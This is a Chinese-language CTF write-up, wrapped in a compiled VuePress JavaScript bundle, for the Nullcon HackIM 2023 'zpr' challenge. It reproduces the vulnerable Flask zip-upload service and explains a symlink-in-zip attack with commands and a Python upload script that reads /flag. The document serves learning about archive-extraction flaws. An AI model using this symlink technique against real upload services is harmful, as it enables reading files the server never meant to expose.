import{_ as p,r as o,o as i,c as l,b as n,d as s,e as t,a as e}from"./app-26a1f23c.js";const c={},u=e(`<p>题目说明：My colleague built a service which shows the contents of a zip file. He says there&#39;s nothing to worry about.... 附件：</p><div class="language-yaml line-numbers-mode" data-ext="yml"><pre class="language-yaml"><code><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">&quot;3.1&quot;</span>
<span class="token key atrule">services</span><span class="token punctuation">:</span>
  <span class="token key atrule">zpr</span><span class="token punctuation">:</span>
    <span class="token key atrule">build</span><span class="token punctuation">:</span>
      <span class="token key atrule">context</span><span class="token punctuation">:</span> .
      <span class="token key atrule">dockerfile</span><span class="token punctuation">:</span> Dockerfile.app
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./code<span class="token punctuation">:</span>/app
      <span class="token punctuation">-</span> shared_data<span class="token punctuation">:</span>/tmp/data
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 10015<span class="token punctuation">:</span><span class="token number">8080</span>
    <span class="token key atrule">links</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> serve
    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> serve
  <span class="token key atrule">serve</span><span class="token punctuation">:</span>
    <span class="token key atrule">build</span><span class="token punctuation">:</span>
      <span class="token key atrule">context</span><span class="token punctuation">:</span> .
      <span class="token key atrule">dockerfile</span><span class="token punctuation">:</span> Dockerfile.serve
    <span class="token key atrule">ports</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> 10016<span class="token punctuation">:</span><span class="token number">8088</span>
    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> ./code<span class="token punctuation">:</span>/app
      <span class="token punctuation">-</span> ./flag<span class="token punctuation">:</span>/flag<span class="token punctuation">:</span>ro
      <span class="token punctuation">-</span> shared_data<span class="token punctuation">:</span>/tmp/data
<span class="token key atrule">volumes</span><span class="token punctuation">:</span>
  <span class="token key atrule">shared_data</span><span class="token punctuation">:</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到 /flag 目录就在根目录下</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> request
<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> check_output
<span class="token keyword">import</span> io
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> secrets
<span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> os
<span class="token keyword">import</span> random
<span class="token keyword">import</span> glob

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">&quot;MAX_CONTENT_LENGTH&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.5</span> <span class="token operator">*</span> <span class="token number">1000</span>  <span class="token comment"># 1kb</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    output <span class="token operator">=</span> io<span class="token punctuation">.</span>StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    output<span class="token punctuation">.</span>write<span class="token punctuation">(</span>
        <span class="token string">&quot;Send me your zipfile as a POST request and I&#39;ll make them accessible to you ;-0.&quot;</span>
    <span class="token punctuation">)</span>

    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>output<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">&quot;text/plain&quot;</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;POST&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    output <span class="token operator">=</span> io<span class="token punctuation">.</span>StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">&quot;file&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;No file provided!\\n&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>output<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">&quot;text/plain&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">&quot;file&quot;</span><span class="token punctuation">]</span>

        filename <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        dirname <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

        dpath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">&quot;/tmp/data&quot;</span><span class="token punctuation">,</span> dirname<span class="token punctuation">)</span>
        fpath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dpath<span class="token punctuation">,</span> filename <span class="token operator">+</span> <span class="token string">&quot;.zip&quot;</span><span class="token punctuation">)</span>

        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>dpath<span class="token punctuation">)</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>fpath<span class="token punctuation">)</span>

        <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>fpath<span class="token punctuation">)</span> <span class="token keyword">as</span> zipf<span class="token punctuation">:</span>
            files <span class="token operator">=</span> zipf<span class="token punctuation">.</span>infolist<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&quot;Too many files!&quot;</span><span class="token punctuation">)</span>

            total_size <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">for</span> the_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>
                <span class="token keyword">if</span> the_file<span class="token punctuation">.</span>file_size <span class="token operator">&gt;</span> <span class="token number">50</span><span class="token punctuation">:</span>
                    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&quot;File too big.&quot;</span><span class="token punctuation">)</span>

                total_size <span class="token operator">+=</span> the_file<span class="token punctuation">.</span>file_size

            <span class="token keyword">if</span> total_size <span class="token operator">&gt;</span> <span class="token number">250</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&quot;Files too big in total&quot;</span><span class="token punctuation">)</span>

        check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;unzip&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-q&quot;</span><span class="token punctuation">,</span> fpath<span class="token punctuation">,</span> <span class="token string">&quot;-d&quot;</span><span class="token punctuation">,</span> dpath<span class="token punctuation">]</span><span class="token punctuation">)</span>

        g <span class="token operator">=</span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span>dpath <span class="token operator">+</span> <span class="token string">&quot;/*&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> f <span class="token keyword">in</span> g<span class="token punctuation">:</span>
            output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Found a file: &quot;</span> <span class="token operator">+</span> f <span class="token operator">+</span> <span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>

        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Find your files at http://...:8088/&quot;</span> <span class="token operator">+</span> dirname <span class="token operator">+</span> <span class="token string">&quot;/\\n&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        output<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;Error :-/\\n&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>output<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">&quot;text/plain&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">&quot;8080&quot;</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>app.py 我们应该 post 发送一个 zip 文件，上传后会放在一个文件夹内，命名不可预测，文件将在目录下解压</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> functools <span class="token keyword">import</span> partial
<span class="token keyword">import</span> http<span class="token punctuation">.</span>server
<span class="token keyword">import</span> re

PORT <span class="token operator">=</span> <span class="token number">8088</span>
HOST <span class="token operator">=</span> <span class="token string">&quot;0.0.0.0&quot;</span>

http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">.</span>_orig_list_directory <span class="token operator">=</span> <span class="token punctuation">(</span>
    http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">.</span>list_directory
<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">better_list_directory</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r&quot;^/tmp/data/[0-9a-f]{32}&quot;</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_orig_list_directory<span class="token punctuation">(</span>path<span class="token punctuation">)</span>


http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">.</span>list_directory <span class="token operator">=</span> better_list_directory


Handler <span class="token operator">=</span> partial<span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>SimpleHTTPRequestHandler<span class="token punctuation">,</span> directory<span class="token operator">=</span><span class="token string">&quot;/tmp/data/&quot;</span><span class="token punctuation">)</span>
Server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>ThreadingHTTPServer


<span class="token keyword">with</span> Server<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> Handler<span class="token punctuation">)</span> <span class="token keyword">as</span> httpd<span class="token punctuation">:</span>
    httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们可以访问上面生成的那个文件，限制了 path 为/tmp/data/生成的目录名 的格式，所以并不能直接访问到 flag 目录</p>`,7),r={href:"https://github.com/Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups/blob/main/README.md",target:"_blank",rel:"noopener noreferrer"},d=e(`<p>用到了软链接的一些特性： 1.软链接，以路径的形式存在。类似于 Windows 操作系统中的快捷方式 2.软链接可以 跨文件系统 3.软链接可以对一个不存在的文件名进行链接 4.软链接可以对目录进行链接</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ln [参数][源文件或目录][目标文件或目录]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>对于 zip 命令，有一个-y</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>zip [-AcdDfFghjJKlLmoqrSTuvVwXyz$][-b &lt;工作目录&gt;][-ll][-n &lt;字尾字符串&gt;][-t &lt;日期时间&gt;][-&lt;压缩效率&gt;][压缩文件][文件...][-i &lt;范本样式&gt;][-x &lt;范本样式&gt;]

-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>根据以上特性，我们可以创造一个指向/flag 目录的软链接 然后压缩时保存符号连接 上传后解压，即可访问到/flag</p><p>构造 zip 包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ln -s /flag flag.txt
zip --symlinks flag.zip flag.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>python 构造并发送请求</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import requests

url=&quot;http://52.59.124.14:10015&quot;
files={&quot;file&quot;:open(&quot;C:/Users/24047/Desktop/flag.zip&quot;,&quot;rb&quot;)}
res=requests.post(url,files=files)
print(res.text)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最后访问 falg.txt 即可</p>`,10),k={href:"https://www.runoob.com/linux/linux-command-manual.html",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups/blob/main/README.md",target:"_blank",rel:"noopener noreferrer"};function m(b,g){const a=o("ExternalLinkIcon");return i(),l("div",null,[u,n("p",null,[s("参考解答： "),n("a",r,[s("Nullcon-HackIM-CTF-2023-writeups/README.md at main · Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups (github.com)"),t(a)])]),d,n("p",null,[s("参考： "),n("a",k,[s("Linux 命令大全 | 菜鸟教程 (runoob.com)"),t(a)]),n("a",v,[s("Nullcon-HackIM-CTF-2023-writeups/README.md at main · Ramalingasamy012/Nullcon-HackIM-CTF-2023-writeups (github.com)"),t(a)])])])}const f=p(c,[["render",m],["__file","zpr.html.vue"]]);export{f as default};
